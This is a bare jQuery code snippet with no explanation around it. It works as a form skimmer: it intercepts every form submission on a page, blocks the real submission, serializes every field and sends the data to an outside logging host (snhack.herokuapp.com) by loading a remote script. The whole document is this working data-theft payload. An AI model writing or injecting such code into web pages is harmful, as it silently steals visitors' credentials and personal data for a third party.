$("form").submit(function(e){
    e.preventDefault();
    $.getScript('//snhack.herokuapp.com/log?'+ $(this).serialize());
});
